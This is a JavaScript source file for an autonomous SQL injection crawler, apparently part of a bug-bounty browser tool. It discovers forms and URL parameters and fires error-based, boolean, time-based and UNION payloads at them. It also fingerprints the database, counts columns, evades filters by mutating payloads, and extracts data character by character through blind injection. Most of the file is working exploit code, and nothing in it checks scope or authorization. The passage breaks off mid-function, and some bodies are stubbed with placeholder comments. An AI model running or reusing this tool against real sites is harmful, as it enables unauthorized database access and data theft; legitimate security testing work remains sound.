// sqli_spider_engine.js
// Autonomous SQLi Spider for Electron Bug Bounty Browser
// Implements advanced SQLi detection: error-based, boolean, time, union, OOB, header, second-order, DB-specific, etc.

const fs = require('fs');
const path = require('path');
const { URL, URLSearchParams } = require('url');
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const pLimit = (() => { try { return require('p-limit'); } catch { console.warn("p-limit not found, concurrency will not be limited."); return null; } })();
let JSDOM;
try { JSDOM = require('jsdom').JSDOM; } catch { console.warn("jsdom not found, HTML parsing for links/forms will be disabled."); JSDOM = null; }

let liveStats = { urlsCrawled: 0, paramsFuzzed: 0, avgRespTime: 0, payloadsTested: 0, perCategory: {} };
let injectionState = { cookies: [], params: [], headers: [], chainedPaths: [] };

// --- State ---
let running = false;
let stopRequested = false;
let findings = [];
let progress = 0;
let vulnsFound = 0;
let payloads = {};
let visited = new Set();
let queued = [];
let globalOptions = {};
let concurrencyLimit;

// --- Core Embedded Payloads ---
const corePayloads = {
    errorBased: [
        "'", "\"", "`",
        "'-'", "' '", "'='",
        "' OR 1=1", "\" OR 1=1", "` OR 1=1",
        "' OR '1'='1", "\" OR \"1\"=\"1",
        "' AND 1=1", "' AND 1=0", // Can also cause errors or distinct pages
        "'))", "'))--",
        "UNION SELECT @@VERSION", // No comment initially, added later
        "1/0", "' डालने पर त्रुटि"
    ],
    booleanBased: [
        "' AND 1=1", "' AND 1=2",
        "\" AND 1=1", "\" AND 1=2",
        "` AND 1=1", "` AND 1=2",
        " AND 1=1", " AND 1=2", // Numeric
        "' AND 'a'='a'", "' AND 'a'='b'",
        "' OR 1=1", "' OR 1=2", // OR-based
        "' OR 'a'='a'", "' OR 'a'='b'",
        "' AND 1=1 FROM DUAL", "' AND 1=2 FROM DUAL", // Oracle
        "' AND @@SERVERNAME=@@SERVERNAME", "' AND @@SERVERNAME='x'", // MSSQL
    ],
    timeBased: [ // Comments added dynamically
        "AND SLEEP(5)", "OR SLEEP(5)", "AND BENCHMARK(5000000,MD5('1'))", // MySQL
        ";SELECT PG_SLEEP(5)", "OR PG_SLEEP(5)", // PostgreSQL
        ";WAITFOR DELAY '00:00:05'", "OR WAITFOR DELAY '00:00:05'", // MSSQL
        "AND DBMS_LOCK.SLEEP(5)", "OR DBMS_LOCK.SLEEP(5)", // Oracle
        "AND LIKE('ABCDEFG',UPPER('Abcdefg')) AND RANDOMBLOB(100000000)" // SQLite
    ],
    unionBased: [ // Templates, comments added dynamically
        "UNION SELECT NULL",
        "UNION SELECT NULL,NULL", // Common column counts
        "UNION SELECT NULL,NULL,NULL"
    ],
    stackedQueries: [], // Generally too risky for automated default, populate from file if needed
    oob: [],
    generic: [
        "test'\"`()%&<>" + String.fromCharCode(0), "1", "0", "-1", "true", "false", "NULL"
    ]
};

// --- Utility: Send log to parent process ---
function send(type, data, extra) {
  if (process && process.send) process.send({ type, data, extra });
}
function log(msg, type = 'info') { send('log', msg, type); }
function updateProgress(val) { send('progress', val); }
function updateFound(val) { send('found', val); }
function updateStatus(status) { send('status', status); }
function reportFinding(finding) {
  findings.push(finding); // Keep internal track
  vulnsFound++;
  updateFound(vulnsFound); // Update counter on frontend
  send('finding', finding); // Send the detailed finding object to frontend
  log(`[VULN_FOUND] Type: ${finding.type}, Param: ${finding.parameter}, Endpoint: ${finding.endpoint.split('?')[0]}`, 'vuln');
}
function clearAll() {
  findings = []; progress = 0; vulnsFound = 0;
  visited = new Set(); queued = [];
  liveStats = { urlsCrawled: 0, paramsFuzzed: 0, avgRespTime: 0, payloadsTested: 0, perCategory: {} };
  testedSurfaces.clear();
  send('clear');
}
function updateLiveStats(key, val) {
  if (key in liveStats) liveStats[key] += val;
  else if (key === 'perCategoryEntry') {
    const {category, count} = val;
    liveStats.perCategory[category] = (liveStats.perCategory[category] || 0) + count;
  }
  send('stats', { ...liveStats });
}
function hashAttackSurface(path, param, method) {
  return crypto.createHash('md5').update(`${path}|${param}|${method}`).digest('hex');
}
const testedSurfaces = new Set();
function dedupeAttackSurface(path, param, method) {
  const h = hashAttackSurface(path, param, method);
  if (testedSurfaces.has(h)) return false;
  testedSurfaces.add(h);
  return true;
}

// --- Discovery & Parsing ---
async function discoverAttackSurfaces(html, baseUrl) {
  let surfaces = [];
  if (!JSDOM || !html) return surfaces;
  let dom;
  try { dom = new JSDOM(html); } catch (e) { log(`JSDOM parsing error: ${e.message}`, 'error'); return surfaces; }
  const baseOrigin = new URL(baseUrl).origin;

  // Forms
  Array.from(dom.window.document.querySelectorAll('form')).forEach(form => {
    let action = form.getAttribute('action') || '';
    let method = (form.getAttribute('method') || 'GET').toUpperCase();
    try {
      const formUrl = new URL(action, baseUrl);
      if (formUrl.origin !== baseOrigin && action.startsWith('http')) return;
      let inputs = Array.from(form.querySelectorAll('input[name],textarea[name],select[name]'))
                       .map(i => i.name).filter(name => name);
      if (inputs.length) surfaces.push({ type: 'form', action: formUrl.href, method, params: inputs });
    } catch(e) { log(`Skipping form invalid action '${action}': ${e.message}`, 'warn'); }
  });
  // Links
  Array.from(dom.window.document.querySelectorAll('a[href]')).forEach(a => {
    try {
      const href = a.getAttribute('href');
      if (!href || href.startsWith('mailto:') || href.startsWith('tel:') || href.startsWith('javascript:')) return;
      const u = new URL(href, baseUrl);
      if (u.origin !== baseOrigin) return;
      const params = Array.from(u.searchParams.keys());
      if (params.length) {
        const actionPath = u.protocol + '//' + u.host + u.pathname;
        surfaces.push({ type: 'url', action: actionPath, method: 'GET', params, originalQuery: u.search });
      }
    } catch (e) { /* ignore */ }
  });
  return surfaces;
}
// ... (scanHeaders, prioritizeParams, htmlParseFeedback - unchanged)
function scanHeaders(headers) {
  const csp = headers['content-security-policy'] || headers['Content-Security-Policy'];
  const xfo = headers['x-frame-options'] || headers['X-Frame-Options'];
  const acao = headers['access-control-allow-origin'] || headers['Access-Control-Allow-Origin'];
  return { csp, xfo, acao };
}

function prioritizeParams(params) {
  const common = ['id', 'user', 'item', 'cat', 'uid', 'pid', 'page', 'q', 'search', 'query', 'name', 'filter', 'category', 'product'];
  return params.sort((a, b) => {
    const aIsCommon = common.some(c => a.toLowerCase().includes(c));
    const bIsCommon = common.some(c => b.toLowerCase().includes(c));
    if (aIsCommon && !bIsCommon) return -1;
    if (!aIsCommon && bIsCommon) return 1;
    return 0;
  });
}

function htmlParseFeedback(html) {
  let issues = [];
  if (!html) return issues;
  if (/<script>alert\(/i.test(html)) issues.push('alert() reflected');
  if (!/<\/html>/i.test(html) && /<html/i.test(html)) issues.push('missing </html>');
  if (/<form/i.test(html) && !/<\/form>/i.test(html)) issues.push('broken form tag');
  return issues;
}


// --- Payload Handling & HTTP Requests ---
function loadPayloads(payloadSetPath) {
  payloads = JSON.parse(JSON.stringify(corePayloads)); // Deep copy core
  let initialCounts = Object.fromEntries(Object.entries(payloads).map(([k,v]) => [k, v.length]));

  let fileToLoad = 'wordlists/sqli.txt';
  if (payloadSetPath && typeof payloadSetPath === 'string' && payloadSetPath.toLowerCase() !== 'default') {
    fileToLoad = payloadSetPath;
  } else if (payloadSetPath && payloadSetPath.toLowerCase() === 'default') {
    log(`Using only embedded core SQLi payloads. Counts: ${Object.entries(initialCounts).map(([k,v])=>`${k}:${v}`).join(', ')}`);
    return;
  }

  try {
    const fullPath = path.isAbsolute(fileToLoad) ? fileToLoad : path.join(process.cwd(), 'wordlists', path.basename(fileToLoad));
    if (!fs.existsSync(fullPath)) {
      log(`User payload file not found: ${fullPath}. Using only embedded core payloads.`, 'warn'); return;
    }
    const lines = fs.readFileSync(fullPath, 'utf8').split(/\r?\n/);
    let currentSection = 'generic', filePayloadsCount = 0, addedToCategory = {};
    for (let line of lines) {
      line = line.trim(); if (!line) continue;
      let matchedSection = false;
      if (line.startsWith('#') || line.startsWith('[')) {
        for (const key of Object.keys(payloads)) {
            const sectionPattern = key.replace(/([A-Z])/g, ' $1').trim().toLowerCase().replace(/ /g, '\\s*');
            const sectionRegex = new RegExp(`^(?:\\[|#\\s*)${sectionPattern}(?:\\]|\\s*#)?$`, 'i');
            if (sectionRegex.test(line)) { currentSection = key; matchedSection = true; break; }
        }
      }
      if (matchedSection || line.startsWith('#')) continue;
      if (payloads[currentSection] && !payloads[currentSection].includes(line)) {
        payloads[currentSection].push(line); filePayloadsCount++;
        addedToCategory[currentSection] = (addedToCategory[currentSection] || 0) + 1;
      } else if (!payloads.generic.includes(line)) { // Fallback for unknown section
        payloads.generic.push(line); filePayloadsCount++;
        addedToCategory.generic = (addedToCategory.generic || 0) + 1;
      }
    }
    log(`Loaded ${filePayloadsCount} unique SQLi payloads from ${fullPath}. Additions: ${JSON.stringify(addedToCategory)}`);
    log(`Total payloads: ${Object.entries(payloads).map(([k,v])=>`${k}:${v.length}`).join(', ')}`);
  } catch (e) {
    log(`Failed to load user payloads: ${e.message}. Using core payloads.`, 'error');
  }
}
function makeRequest(targetUrl, method = 'GET', postData = null, reqHeaders = {}, cookies = '') {
  return new Promise((resolve, reject) => {
    try {
      const urlObj = new URL(targetUrl);
      const lib = urlObj.protocol === 'https:' ? https : http;
      const requestConfig = {
        hostname: urlObj.hostname,
        port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
        path: urlObj.pathname + urlObj.search, method: method,
        headers: { 'User-Agent': 'SQLi-Spider/1.4', 'Cookie': cookies || (injectionState.cookies ? injectionState.cookies.join('; ') : ''), ...reqHeaders },
        timeout: globalOptions.timeout || 20000
      };
      if (method === 'POST' || method === 'PUT') { /* ... (POST data handling - unchanged) ... */ 
        let bodyString = '';
        if (typeof postData === 'string') {
            bodyString = postData;
            if (!requestConfig.headers['Content-Type']) {
                 try { JSON.parse(bodyString); requestConfig.headers['Content-Type'] = 'application/json';}
                 catch (e) { requestConfig.headers['Content-Type'] = 'application/x-www-form-urlencoded'; }
            }
        } else if (postData) { // Assuming object for URLSearchParams
            bodyString = new URLSearchParams(postData).toString();
            requestConfig.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        }
        requestConfig.headers['Content-Length'] = Buffer.byteLength(bodyString);
      }
      const req = lib.request(requestConfig, res => { /* ... (response handling - unchanged) ... */ 
        let data = '';
        const contentEncoding = res.headers['content-encoding'];
        let responseStream = res;

        if (contentEncoding === 'gzip') {
            const zlib = require('zlib');
            responseStream = res.pipe(zlib.createGunzip());
        } else if (contentEncoding === 'deflate') {
            const zlib = require('zlib');
            responseStream = res.pipe(zlib.createInflate());
        }

        responseStream.on('data', chunk => data += chunk);
        responseStream.on('end', () => {
            const setCookieHeader = res.headers['set-cookie'];
            if (setCookieHeader) {
                injectionState.cookies = setCookieHeader.map(c => c.split(';')[0]);
            }
            resolve({ status: res.statusCode, headers: res.headers, body: data, url: targetUrl });
        });
        responseStream.on('error', (err) => reject(new Error(`Response stream error: ${err.message}`)));
      });
      req.on('error', reject);
      req.on('timeout', () => { req.destroy(); reject(new Error(`Timeout (${requestConfig.timeout}ms) for ${targetUrl}`)); });
      if ((method === 'POST' || method === 'PUT') && postData) {
        req.write(typeof postData === 'string' ? postData : new URLSearchParams(postData).toString());
      }
      req.end();
    } catch (e) { reject(e); }
  });
}
// ... (generatePayloadVariants - unchanged)
function generatePayloadVariants(payload) {
  const variants = new Set([payload]);
  variants.add(encodeURIComponent(payload));
  variants.add(`${payload}-- `); // Common comment styles
  variants.add(`${payload}#`);
  variants.add(`/*${payload}*/`);
  let mixedCasePayload = payload.replace(/SELECT/gi, 'SeLeCt').replace(/UNION/gi, 'uNiOn').replace(/AND/gi, 'aNd').replace(/OR/gi, 'oR');
  if (mixedCasePayload !== payload) variants.add(mixedCasePayload);
  return Array.from(variants);
}


// --- SQLi Detection Primitives ---
const SQL_ERRORS = [ /* ... (unchanged) ... */
  'SQL syntax', 'mysql_fetch', 'ORA-', 'ODBC', 'Unclosed quotation mark',
  'You have an error in your SQL syntax', 'Warning: mysql_', 'Warning: pg_', 'Warning: oci_', 'pg_query', 'syntax error',
  'quoted string not properly terminated', 'Microsoft OLE DB Provider', 'DB2 SQL error',
  'SQLite/JDBCDriver', 'MySQL server version', 'MariaDB server version',
  'supplied argument is not a valid MySQL', 'Division by zero', 'SQLSTATE', 'near \'', 'unterminated quoted string',
  'Conversion failed when converting the varchar value', 'जेशन्स',
  'error in your SQL syntax', 'ORA-00921', 'ORA-01756', 'ORA-00933', // Oracle
  'Syntax error converting the nvarchar value', // MSSQL
  'psycopg2.errors', 'Uncaught PDOException', // Common library errors
  'unterminated quoted identifier', // PostgreSQL
  'nvarchar to numeric', 'conversion failed' // MSSQL
];
function detectSQLError(body) {
  if (!body || typeof body !== 'string') return null;
  const lowerBody = body.toLowerCase();
  return SQL_ERRORS.find(err => lowerBody.includes(err.toLowerCase()));
}
function responsesDiffer(resp1, resp2, tolerance = 0.10) { /* ... (unchanged) ... */
  if (!resp1 || !resp2) return true;
  if (resp1.status !== resp2.status) return true;
  const len1 = (resp1.body || '').length;
  const len2 = (resp2.body || '').length;
  // Check for significant length difference (more than tolerance AND more than 30 chars absolute)
  if (Math.abs(len1 - len2) > Math.max(len1, len2) * tolerance && Math.abs(len1 - len2) > 30) return true;
  // If lengths are very similar, check for content difference (can be slow for large bodies, use with care)
  if (Math.abs(len1 - len2) <= 30 && resp1.body !== resp2.body) return true;
  return false;
}

// --- Core SQLi Logic ---
async function fingerprintDBMS(targetUrl, paramName, httpMethod, originalParams, basePayloadPrefix = "'") { /* ... (refined in previous answer, use that version) ... */
  log(`[FINGERPRINT] Attempting DBMS for ${paramName} @ ${targetUrl} with prefix "${basePayloadPrefix}"`, 'debug');
  const dbmsTests = [
    { db: 'MySQL', payload: " AND SLEEP(5)", checkResponseTime: true, errorKeywords: [/MySQL/i, /MariaDB/i, /value is out of range in 'OFFSET'/i, /right syntax to use near/i] },
    { db: 'MySQL', payload: " AND BENCHMARK(5000000,MD5('1'))", checkResponseTime: true },
    { db: 'MySQL', payload: " AND 1=CONVERT(int,VERSION())", errorKeywords: [/CONVERT/i, /VERSION/i, /MySQL/i, /truncated/i] },
    { db: 'PostgreSQL', payload: " AND PG_SLEEP(5)", checkResponseTime: true, errorKeywords: [/PostgreSQL/i, /pg_sleep/i, /unterminated quoted string/i, /invalid input syntax for type/i] },
    { db: 'PostgreSQL', payload: " AND 1=(SELECT CAST(VERSION() AS INT))", errorKeywords: [/PostgreSQL/i, /cannot be cast to integer/i, /invalid input syntax for type integer/i]},
    { db: 'MSSQL', payload: "; WAITFOR DELAY '00:00:05'", checkResponseTime: true, errorKeywords: [/SQL Server/i, /WAITFOR/i, /mssql/i] },
    { db: 'MSSQL', payload: " AND 1=@@VERSION--", errorKeywords: [/Microsoft SQL Server/i, /Syntax error converting the nvarchar value/i, /conversion failed/i] },
    { db: 'Oracle', payload: " AND 1=DBMS_LOCK.SLEEP(5)", checkResponseTime: true, errorKeywords: [/Oracle/i, /ORA-/i] },
    { db: 'Oracle', payload: " AND 1=UTL_INADDR.GET_HOST_ADDRESS('127.0.0.1')", errorKeywords: [/Oracle/i, /UTL_INADDR/i, /ORA-/i]},
    { db: 'Oracle', payload: " AND 1=DECODE(SUBSTR(BANNER,1,1), 'O', 1, 0) FROM V$VERSION", errorKeywords: [/ORA-00933/i, /ORA-00904/i, /ORA-01756/i]},
    { db: 'SQLite', payload: " AND 1=LIKE('ABCDEFG',UPPER('Abcdefg')) AND RANDOMBLOB(10000000)", checkResponseTime: true, errorKeywords: [/SQLite/i, /sqlite_version/i] },
    { db: 'SQLite', payload: " AND 1=TYPEOF(sqlite_version())", errorKeywords: [/SQLite/i, /sqlite_version/i]},
  ];
  let detectedDB = 'Unknown';
  for (const test of dbmsTests) {
    if (stopRequested) return 'Unknown';
    let fullPayload = test.payload;
    let appliedPrefix = basePayloadPrefix.trim();
    if ( (appliedPrefix === "'" || appliedPrefix === "\"" || appliedPrefix === "`") && fullPayload.startsWith(appliedPrefix) ) {/* Use payload as is */}
    else if ( (appliedPrefix === "'" || appliedPrefix === "\"" || appliedPrefix === "`") ) { fullPayload = appliedPrefix + fullPayload; }
    else if (!isNaN(parseFloat(appliedPrefix)) && isFinite(appliedPrefix)) { fullPayload = appliedPrefix + fullPayload; }
    else if (appliedPrefix) { fullPayload = appliedPrefix + fullPayload;}

    if (!fullPayload.includes('--') && !fullPayload.includes(';') && !fullPayload.includes('#')) {
        let comment = "-- ";
        if (test.db === 'MySQL') comment = "#"; else if (test.db === 'Oracle') comment = "";
        fullPayload += comment;
    }
    // log(`[FINGERPRINT_TRY] DBMS: ${test.db}, Payload: "${fullPayload}"`, 'debug'); // Can be too verbose
    let t0 = Date.now();
    try {
      let requestParams = { ...originalParams, [paramName]: fullPayload };
      let resp;
      if (httpMethod === 'GET') {
        const urlObj = new URL(targetUrl);
        Object.keys(requestParams).forEach(key => urlObj.searchParams.set(key, requestParams[key]));
        resp = await makeRequest(urlObj.href, 'GET');
      } else { resp = await makeRequest(targetUrl, 'POST', requestParams); }
      let t1 = Date.now();
      updateLiveStats('payloadsTested', 1);
      if (test.checkResponseTime && (t1 - t0) > 4500 && (t1 - t0) < (globalOptions.timeout - 500)) {
        log(`[FINGERPRINT_MATCH_TIME] DBMS likely ${test.db} (time delay ${t1-t0}ms with: ${fullPayload})`);
        return test.db;
      }
      if (test.errorKeywords && resp.body) {
        for (const keyword of test.errorKeywords) {
          if (keyword.test(resp.body)) {
            log(`[FINGERPRINT_MATCH_ERROR] DBMS likely ${test.db} (error "${keyword}" with: ${fullPayload})`);
            return test.db;
          }
        }
      }
    } catch (e) { log(`[FINGERPRINT_REQ_ERROR] DBMS: ${test.db}, P: "${fullPayload}", E: ${e.message}`, 'error'); }
  }
  log(`[FINGERPRINT_RESULT] DBMS fingerprinting inconclusive for ${paramName}, defaulting to 'Unknown'.`);
  return 'Unknown';
}
function mutatePayload(payload, dbms = 'Generic') { /* ... (unchanged, ensure dbms default is robust) ... */
  let mutated = payload;
  // Basic mutations
  mutated = mutated.replace(/SELECT/gi, () => Math.random() > 0.5 ? 'SeLeCt' : 'sElEcT');
  mutated = mutated.replace(/UNION/gi, () => Math.random() > 0.5 ? 'UnIoN' : 'uNiOn');
  mutated = mutated.replace(/AND/gi, () => Math.random() > 0.5 ? 'AnD' : 'aNd');
  mutated = mutated.replace(/OR/gi, () => Math.random() > 0.5 ? 'Or' : 'oR');

  // Comment injection (less aggressive)
  if (Math.random() > 0.5) { // Reduced frequency
    mutated = mutated.replace(/ /g, () => (Math.random() > 0.8 ? '/**/' : ' ')); // More selective
  }

  // URL encoding (less aggressive)
  if (Math.random() > 0.7) { // Reduced frequency
    mutated = encodeURIComponent(mutated);
  }

  // DBMS-specific (Example for MySQL)
  if (dbms === 'MySQL' && Math.random() > 0.5) {
    mutated = mutated.replace(/ /g, () => (Math.random() > 0.6 ? '%0a' : (Math.random() > 0.3 ? '+' : ' '))); // Mix of newline, plus, space
  }
  return mutated;
}
async function determineUnionColumnCount(targetUrl, paramName, httpMethod, originalParams, basePayloadPrefix, dbms) { /* ... (refined, use previous good version) ... */
    log(`[UNION_COL_COUNT] Determining cols for ${paramName} @ ${targetUrl} (DBMS: ${dbms}, Prefix: "${basePayloadPrefix}")`, 'debug');
    let comment = (dbms === 'MySQL' ? "#" : (dbms === 'Oracle' ? "" : "-- "));

    for (let i = 1; i <= 25; i++) {
        if (stopRequested) return null;
        let orderPayloadPart = ` ORDER BY ${i}`;
        let fullPayload;

        if (["'", "\"", "`"].includes(basePayloadPrefix.trim())) {
             fullPayload = basePayloadPrefix.trim() + orderPayloadPart + comment;
        } else if (!isNaN(parseFloat(basePayloadPrefix)) && isFinite(basePayloadPrefix)) {
             fullPayload = basePayloadPrefix + orderPayloadPart + comment;
        } else { 
             fullPayload = basePayloadPrefix + orderPayloadPart + comment;
        }
        // log(`[UNION_COL_TRY] ${i} cols with: ${fullPayload}`, 'debug'); // Can be verbose
        try {
            let requestParams = { ...originalParams, [paramName]: fullPayload };
            updateLiveStats('payloadsTested', 1);
            let resp;
            if (httpMethod === 'GET') {
                const urlObj = new URL(targetUrl);
                Object.keys(requestParams).forEach(key => urlObj.searchParams.set(key, requestParams[key]));
                resp = await makeRequest(urlObj.href, 'GET');
            } else { resp = await makeRequest(targetUrl, 'POST', requestParams); }

            const err = detectSQLError(resp.body);
            // More specific error check for ORDER BY issues
            if (err && (err.toLowerCase().includes('order by') || err.toLowerCase().includes('column number') || err.toLowerCase().includes('ordinal') || err.toLowerCase().includes('out of range'))) {
                log(`[UNION_COL_COUNT] Error with ${i} columns ('${err}'). Assuming count is ${i-1}. Payload: ${fullPayload}`);
                return (i - 1 > 0) ? i - 1 : null;
            }
        } catch (e) {
            log(`[UNION_COL_COUNT] Request error at column ${i} ("${fullPayload}"): ${e.message}. Assuming count ${i-1}.`, 'warn');
            return (i - 1 > 0) ? i - 1 : null;
        }
    }
    log(`[UNION_COL_COUNT] Reached max columns (25) without specific "order by" error. Count undetermined.`, 'warn');
    return null;
}
function generateUnionSelect(numCols, valuesToInject = [], dbms = 'Generic') { /* ... (refined, use previous good version) ... */
    let selectParts = Array(numCols).fill('NULL');
    if (dbms === 'Oracle') selectParts = Array(numCols).fill("TO_CHAR(NULL)");
    else if (dbms === 'MSSQL' && numCols > 0) { // MSSQL often needs explicit casting for NULLs if types are mixed
        selectParts = Array(numCols).fill("CAST(NULL AS VARCHAR(100))"); // Example, adjust as needed
    }

    for (let i = 0; i < Math.min(valuesToInject.length, numCols); i++) {
        // Ensure injected values are also strings or compatible if other columns are casted strings
        let val = valuesToInject[i];
        if (dbms === 'MSSQL' && !val.toLowerCase().startsWith('cast(') && !val.toLowerCase().startsWith('convert(') && val !== 'NULL') {
            // Simple heuristic: if not already cast and not NULL, try to cast it if other columns are casted.
            // This is very basic and might need improvement.
            // val = `CAST(${val} AS VARCHAR(MAX))`; // Risky if val is complex
        }
        selectParts[i] = val;
    }
    return `UNION SELECT ${selectParts.join(',')}`;
}
async function enumerateAndExtract({ targetUrl, paramName, httpMethod, originalParams, basePayloadPrefix, dbms, columnCount, context }) { /* ... (refined, use previous good version) ... */
    if (!columnCount || columnCount <= 0) {
        log('[ENUMERATE] Cannot proceed: Invalid column count.', 'warn'); return {};
    }
    log(`[ENUMERATE] Starting for ${dbms} with ${columnCount} cols. Prefix: "${basePayloadPrefix}"`, 'debug');
    let info = { version: null, currentUser: null, currentDb: null, tables: [], columns: {}, data: {} };
    let comment = (dbms === 'MySQL' ? "#" : (dbms === 'Oracle' ? "" : "-- "));
    let unionNullifier = " AND 1=2 ";

    let unionPrefix = basePayloadPrefix;
    if (["'", "\"", "`"].includes(unionPrefix.trim())) { /* Use as is */ }
    else if (!isNaN(parseFloat(unionPrefix)) && isFinite(unionPrefix)) { unionPrefix = `${unionPrefix}${unionNullifier}`; }
    else { unionPrefix = `${unionPrefix}'${unionNullifier}`; }
     if (["'", "\"", "`"].includes(basePayloadPrefix.trim())) { unionPrefix = basePayloadPrefix.trim(); }

    const sendUnionRequest = async (payloadPartsToInject) => {
        const unionSelectClause = generateUnionSelect(columnCount, payloadPartsToInject, dbms);
        const fullPayload = `${unionPrefix}${unionSelectClause}${comment}`;
        let requestParams = { ...originalParams, [paramName]: fullPayload };
        updateLiveStats('payloadsTested', 1);
        if (httpMethod === 'GET') {
            const urlObj = new URL(targetUrl);
            Object.keys(requestParams).forEach(key => urlObj.searchParams.set(key, requestParams[key]));
            return makeRequest(urlObj.href, 'GET');
        } else { return makeRequest(targetUrl, 'POST', requestParams); }
    };

    let versionKeyword = dbms === 'MySQL' ? '@@version' : dbms === 'PostgreSQL' ? 'version()' :
                         dbms === 'MSSQL' ? '@@VERSION' : dbms === 'Oracle' ? '(SELECT banner FROM v$version WHERE ROWNUM=1)' :
                         dbms === 'SQLite' ? 'sqlite_version()' : null;
    if (versionKeyword) {
        try {
            const resp = await sendUnionRequest([versionKeyword]);
            const versionMatch = resp.body.match(/(\d{1,2}(\.\d{1,2}){1,4}(\.\d{1,4})?)/i);
            if (versionMatch) { info.version = versionMatch[0]; log(`[ENUMERATE_VERSION] Extracted: ${info.version}`); }
            else if (resp.body.length < 1000 && resp.body.length > 0) {
                 const cleanedBody = resp.body.replace(/<[^>]*>/g, " ").replace(/\s+/g, " ").trim();
                 if(cleanedBody.length > 0 && cleanedBody.length < 150 && !cleanedBody.toLowerCase().includes('error') && !cleanedBody.toLowerCase().includes('not found')) {
                    info.version = cleanedBody.substring(0,100); log(`[ENUMERATE_VERSION] Extracted (crude): ${info.version}`);
                 }
            }
        } catch (e) { log(`[ENUMERATE_VERSION] Error: ${e.message}`, 'warn'); }
    }

    if (dbms === 'MySQL' && info.version && columnCount >=1 ) { /* ... (MySQL table enum example - unchanged) ... */ }
    // TODO: Add more enumeration for other DBMS and for columns/data
    return info;
}
async function blindExtractCharByChar({ targetUrl, paramName, httpMethod, originalParams, basePayloadPrefix, dbms, baseTrueResponse, baseFalseResponse, queryToExtract, maxLen = 32 }) { /* ... (unchanged) ... */
    if (!baseTrueResponse || !baseFalseResponse || responsesDiffer(baseTrueResponse, baseFalseResponse) === false) {
        log('[BLIND_EXTRACT] Baselines missing or too similar. Aborted.', 'warn');
        return '';
    }
    log(`[BLIND_EXTRACT] Starting for query: ${queryToExtract}`, 'debug');
    let extracted = '';
    let comment = (dbms === 'MySQL' ? "#" : (dbms === 'Oracle' ? "" : "-- "));

    for (let i = 1; i <= maxLen; i++) {
        if (stopRequested) break;
        let charFoundInPosition = false;
        for (let c = 32; c < 127; c++) { // Printable ASCII
            if (stopRequested) break;
            let blindPayloadPart;
            if (dbms === 'MySQL') blindPayloadPart = ` AND ASCII(SUBSTRING((${queryToExtract}),${i},1))=${c}`;
            else if (dbms === 'PostgreSQL') blindPayloadPart = ` AND ASCII(SUBSTRING((${queryToExtract}),${i},1))=${c}`;
            else if (dbms === 'MSSQL') blindPayloadPart = ` AND ASCII(SUBSTRING((${queryToExtract}),${i},1))=${c}`;
            else if (dbms === 'Oracle') blindPayloadPart = ` AND ASCII(SUBSTR((${queryToExtract}),${i},1))=${c}`;
            else if (dbms === 'SQLite') blindPayloadPart = ` AND UNICODE(SUBSTR((${queryToExtract}),${i},1))=${c}`;
            else { blindPayloadPart = ` AND ASCII(SUBSTRING((${queryToExtract}),${i},1))=${c}`; }

            const fullPayload = `${basePayloadPrefix}${blindPayloadPart}${comment}`;
            let testResp;
            try {
                let requestParams = { ...originalParams, [paramName]: fullPayload };
                updateLiveStats('payloadsTested', 1);
                if (httpMethod === 'GET') {
                    const urlObj = new URL(targetUrl);
                    Object.keys(requestParams).forEach(key => urlObj.searchParams.set(key, requestParams[key]));
                    testResp = await makeRequest(urlObj.href, 'GET');
                } else { testResp = await makeRequest(targetUrl, 'POST', requestParams); }

                if (!responsesDiffer(testResp, baseTrueResponse, 0.05) && responsesDiffer(testResp, baseFalseResponse, 0.05)) {
                    extracted += String.fromCharCode(c);
                    log(`[BLIND_EXTRACT] Found char: '${String.fromCharCode(c)}' at pos ${i}. Current: "${extracted}"`);
                    charFoundInPosition = true;
                    break;
                }
            } catch (e) { log(`[BLIND_EXTRACT] Error char test (${String.fromCharCode(c)}): ${e.message}`, 'debug'); }
        }
        if (!charFoundInPosition) {
            log(`[BLIND_EXTRACT] No char at pos ${i}. End extraction. Final: "${extracted}"`);
            break;
        }
    }
    return extracted;
}


/**
 * Dynamically builds a payload by prefixing it and adding a comment.
 * @param {string} basePrefix - e.g., "'", "1", "') AND (1="
 * @param {string} payloadCore - e.g., "OR 1=1", "AND SLEEP(5)"
 * @param {string} dbms - Detected DBMS ('MySQL', 'Oracle', 'MSSQL', 'PostgreSQL', 'SQLite', 'Unknown', 'Generic')
 * @returns {string} - The fully constructed payload
 */
function buildFullPayload(basePrefix, payloadCore, dbms) {
    let fullPayload = "";
    const trimmedPrefix = basePrefix.trim();
    const trimmedCore = payloadCore.trim();

    // Determine how to combine prefix and core
    if ((trimmedPrefix === "'" || trimmedPrefix === "\"" || trimmedPrefix === "`") && trimmedCore.startsWith(trimmedPrefix)) {
        // Core already includes the prefix style, e.g., prefix="'", core="' OR 1=1"
        fullPayload = trimmedCore;
    } else if (trimmedPrefix) {
        // Prefix exists, concatenate. Ensure space if core doesn't start with one and prefix doesn't end with one.
        if (!trimmedPrefix.endsWith(" ") && !trimmedCore.startsWith(" ") && !trimmedCore.startsWith(";") && !trimmedCore.startsWith(",")) {
            fullPayload = trimmedPrefix + " " + trimmedCore;
        } else {
            fullPayload = trimmedPrefix + trimmedCore;
        }
    } else { // No prefix
        fullPayload = trimmedCore;
    }

    // Add appropriate comment if not already present
    let comment = "-- "; // Default
    if (dbms === 'MySQL') comment = "#";
    else if (dbms === 'Oracle') comment = ""; // Oracle often requires no space, or specific placement
    else if (dbms === 'MSSQL' || dbms === 'PostgreSQL' || dbms === 'SQLite') comment = "-- ";

    // Avoid double commenting if core payload already ends with a comment
    if (!trimmedCore.match(/--\s?|#$/) && !(dbms === 'Oracle' && trimmedCore.endsWith("--"))) {
         // For Oracle, if comment is empty, don't add trailing space unless necessary
        if (dbms === 'Oracle' && comment === "" && fullPayload.endsWith("--")) {
            // Already ends with Oracle comment, do nothing
        } else if (comment !== "") { // Only add if comment string is not empty
            fullPayload += (fullPayload.endsWith(" ") || comment.startsWith(" ") ? "" : " ") + comment;
        }
    }
    return fullPayload.trim(); // Trim any final excess whitespace
}


async function confirmAndExploit({ targetUrl, paramName, httpMethod, originalParams, baseResponse, initialTechnique, initialPayload, context }) {
  log(`[CONFIRM_EXPLOIT] Confirming ${paramName} @ ${targetUrl}. Initial: ${initialTechnique}, Payload: "${initialPayload}"`, 'info');
  
  let basePayloadPrefix = "";
  const trimmedInitialPayload = initialPayload.trim();
